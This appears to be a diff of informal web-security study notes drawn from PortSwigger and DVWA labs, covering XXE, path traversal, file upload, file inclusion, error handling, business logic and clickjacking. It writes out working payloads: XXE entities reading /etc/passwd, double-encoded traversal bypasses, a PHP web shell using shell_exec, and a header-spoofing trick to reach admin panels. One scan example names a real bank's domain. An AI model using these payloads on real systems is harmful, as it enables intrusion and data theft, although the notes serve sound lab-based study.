+			first use burp browser and send request to repeater after turning intercept on 
+			then intercept off
+
+			in this example we click on exploit server
+			type of external entity on url
+
+			we add some codes on body of web page to show them
+
+			<!ENTITY %file SYSTEM "file:///etc/passwd">
+			<!ENTITY %eval "<!ENTITY &#x25; exfile SYSTEM 'file:///invalid-file;'>">
+			%eval
+			%exfile
+
+			must put our url of portswigger on test
+
+			<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "url of portswigger"> %xxe]>
+			put this on <xml> inside the body request and inspector
+			after execution see some error
+
+		can use mix attack with xml injection and ssrf
+			<!DOCTYPE foo [<!ENTITY xxe SYSTEM "url of portswigger or another sites">]>
+
+			put this inside xml part of repeater and inspector body request
+			use &xxe; value to execute parameters
+			after execution we find subdomins
+			repeater this code with new substings to reachthe secret keys
+
+	path traversal
+		our sites has pictures so if be carefull must hide path on url and users visiblity
+		these methods are applicable on file injection and file uploads
+
+		turn on intercept use burp browser and send request to repeater then turn off intercept
+		inside the inspector on body request
+			get /  image  filen_name=1.jpg
+
+			if change to 
+				get / image file_name=../../../etc/passwd
+
+				reach the passswords
+
+		if use protectionmethods like replacement scripts 
+			replace ("./","")
+
+			can categorize 
+				non recursive
+				recursive
+
+		if block all parameters like ../
+
+		path traversal non recursive
+			....//....//....//etc/passwd
+
+			if use filtering mechanis our request will be like this
+				../../../etc/passwd
+
+				some feature can block /
+				better use decoder tab on burp then convert and use new format of encoding
+					/ means %2f
+					
+					if our waf block all % what should we do
+					must encode agian %
+						% means %25
+
+					our results are %252f > / (encoded mode of slash)
+
+			..%252f..%252f..%252fetc/passwd
+
+			we can use name of file and main path without change or modification url
+				inspection part and body request on repeater
+
+				get / image file_name=/var/www/img/../../../etc/passwd
+
+		upload file limitation adn attack
+			some pages has file upload feature
+			must be carefull about type and size
+
+			webshell upload
+				turn on intercept use burp browser then turn off intercept
+				try uploading some picture on site and check path from proxy tab of burp suit and history
+
+					files/avatar
+
+				save this code with .php format and upload on site inside the file/avatar
+					<?PHP echo file_get_content('/home/cards/secret')>
+
+				then use repeater and change host part of body request inside inspector
+				format of  host
+					host= x.com..../file/avatar/a.jpg
+
+					host= x.com..../file/avatar/a.php
+
+					after execution we can see secret key of user
+
+		file upload
+			local file inclusion (lfi)
+			remote file inclusion (rfi)
+
+			rfi send request to main server from another server
+			but lfi use direct connection and request
+
+			reflected xss is not same with these concepts
+
+			rfi format
+				x.com/1/2/3=y.com/test/robots.txt
+
+			dvwa security > low
+				can upload any thing on server without limitation
+
+			dvwa security > medium
+				deny upload files with file types except images-jpg
+
+				use burp browser and intercept on
+				then upload files on site to test and determine our path 
+				on proxy tab inside burp can see them
+				upload our file
+				after recieve path and detct page use repeater and turn off intercept
+				on content-type part of inspector and body request change our upload content-type mode 
+				must be on image-jpeg
+
+				after sending  access us to hack them 
+				must click on link and path of upload file 
+				see codes inside browser
+
+				<?php echo file_get_contecnt('/home/carlos/secret');?>
+
+			dvwa security > high
+				hee we need deep changes to hack them 
+
+				on high security use  extention check no file type
+
+				if change file a.php
+				<?php echo file_get_contecnt('/home/carlos/secret');?>
+				to a.jpg
+
+				we can't reach the content so what should we do
+
+				on repeater and inspector see php code that couldn't realize images codes
+					a.jpg
+					GIF98
+					<?php echo file_get_contecnt('/home/carlos/secret');?>
+
+					now we can upload file
+					but have problem couldn't see our data
+
+		file inclusion
+			dvwa security > low
+				has no limitation
+
+				x.com/1/2/3=http://y.com/robots.txt (rfi model)
+
+			dvwa security > medium
+				block some parameters like
+					../
+					..\\
+					http://
+					https://
+
+				we can bypass them with 
+					....//
+					....\\\\
+					Https://
+					Http://
+
+			dvwa security > high
+				must starts with gile and exclude include.php
+
+		malicious file upload
+			on cyber key chain attacks we have many indirect attacks to reach organization unit attack
+
+			attack.mitre.org
+
+			for using this must turn off our antivirus nad firewall cause ommit them
+				x.php
+					if(isset ($_REQUEST['cmd'])){ echo "<pre>".shell_exec($_REQUEST['cmd'])."</pre>"}
+
+					inside php files can be execute like embeded model
+
+					for test we upload it on 
+						localhost > xamp > htdocs > wordpress > wordpress > wp-content > 2024 > pattern > hidden-search.php
+
+						on url
+							http://localhost/wordpress/wordpress/wp-content/2024/pattern/hidden-search.php?cmd=ipconfig
+
+	error handeling
+		input mismatch
+		network timeout
+		stack trace
+		memory dumps (anicover problems)
+
+		during server communication we can detdct server os and versions
+		api inside websites adn services could be detected
+
+		syntax error
+		runtime error
+		logical error
+
+		x.com/y/z?id=5'
+		x.com/y/z?id=5"
+			find attributes on error
+
+		status codes
+			300(redirect)
+				301 (permanent)
+				302(temporary)
+				304(not modified)
+
+			400(client side error)
+				401(unauthorized error)
+				403(forbidden)
+				404(not found)
+				405(method not allowed)
+
+			500(server side error)
+				501(not implemented)
+				502(bad gateway)
+				503(service unreachable)
+				504(gateway timeout)
+
+		robots.txt used for web crawls and indexing
+		if sombody find pages what should we do?
+		for bad error handeling we can see some paths
+
+		wafwoof on kali is tools say organization waf name and versions base on wafs signature
+			wafwoof -v x.com
+			indianbank.in
+
+			we can find version and cve on versions
+
+		we can use some paramters on sending requests to server and find errors
+		also we can access admin panel on some projects but need admin local user or address so
+			on repeater we set trace command instead of setting get method
+				on response panel we find 
+					x-custom-ip-authorize > 1.2.3.4 (public ip)
+
+					if replace 127.0.0.1 with our  public ip can access the panel
+
+					also we can set burp > setting > proxy > match and replace
+						type > request header
+							replace with  > x-custom-ip-authorize 127.0.0.1
+
+							login on automated mode and reach the admin panel
+
+	business logic
+		we have best technical performance but have flow error
+
+		some sites need 3 steps authentication and access panel
+			username and password
+			recieved code on simcard
+			fingerprint or certificate 
+
+			in business logic we can bypass steps adn here is problem
+
+		diagram and technical documents 
+			active diagram
+			sequence diagram
+
+		application logic and work flow
+
+		safe payment has many scenarios
+
+		in business logic our employee are in not tools or not performances
+		we have lab on portswigger
+			jacket is 1331$ we have have 100$ so what should we do?
+
+			login on account with wiene and peter username password then 
+			use intecept on on burp also check the requests 
+			on ispector and proxy part we find values on request field (cost or price  field name)
+			change price so access the values
+
+		another lab is we can set minus values on logic has problem
+		we can set quantity with -10 * price 50$ means you are creditor
+
+		anothe lab has discount code if use them with replacing one by one could reache 1$
+
+	weak crypto graphy
+		all requests must be encrypted on latest algorythems from users and clients to server
+		key length and pes must be powerfull
+
+		we have hardcode term in programming means implemente our keys and encrypted values inside the code or transfered data
+
+	client side examinations
+		Vulnerabilities on client side like click jacking
+
+		click jacking use iframe tag on html
+
+			<html>
+			<body>
+			<>iframe src="x.com" height=200 wifth=200> </iframe>
+			</body>
+			</html>
+
+		we can use burp tools for click jacking
+			burp > burp > click bandit
+				check site for click jacking
+				copy commands and paste on sites console (if deny use allow paste command then paste them)
+
+	url redirection
+		better use option redirection on maximum security
+		attackers might use another domain inside this option and set location header on own way
+
+		in redirections we have location header help us 
+
+		y.com/?redirect=fake.com
+
+		usaully see some characters at the end of url 
